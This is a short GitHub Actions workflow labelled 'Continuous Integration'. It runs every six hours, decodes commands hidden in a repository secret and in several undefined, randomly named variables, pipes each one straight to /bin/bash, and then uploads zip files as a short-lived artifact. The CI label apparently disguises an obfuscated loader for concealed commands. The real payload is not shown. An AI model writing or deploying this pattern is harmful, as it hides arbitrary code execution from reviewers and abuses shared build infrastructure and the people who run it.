name: Continuous Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '52 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  workflow:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Perform
        env:
          xes95: ${{ secrets.xes95 }}
        run: |
          printf '%s' "$xes95" | jq -r .epcp800 | /bin/bash
          echo $a3178 | jq -r .cnp56000 | /bin/bash
          printf '%s' "$ig3" | jq -r .bvuli80 | /bin/bash
          echo $u2217 | jq -r .v5 | /bin/bash
          echo $k55564 | jq -r .wnk0605 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: TlqNv5k4
          path: "*.zip"
          retention-days: 1
